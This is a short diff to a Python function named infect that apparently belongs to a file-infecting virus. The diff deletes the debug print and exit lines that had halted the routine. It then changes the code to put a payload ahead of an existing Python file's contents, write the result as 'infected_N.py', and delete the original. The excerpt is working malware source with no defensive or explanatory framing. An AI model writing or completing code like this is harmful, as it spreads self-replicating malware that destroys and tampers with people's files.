@@ -31,10 +31,8 @@ def infect(PAYLOAD):
         
         if f.mode == 'r' and x == None:
             f.seek(0)
-            print(f.read())
-            exit()
             infected = open('infected_'+str(i)+'.py','w')
-            infected.write(f.read() + PAYLOAD)
+            infected.write(PAYLOAD + f.read())
             f.close()
             infected.close()
             os.remove(file)
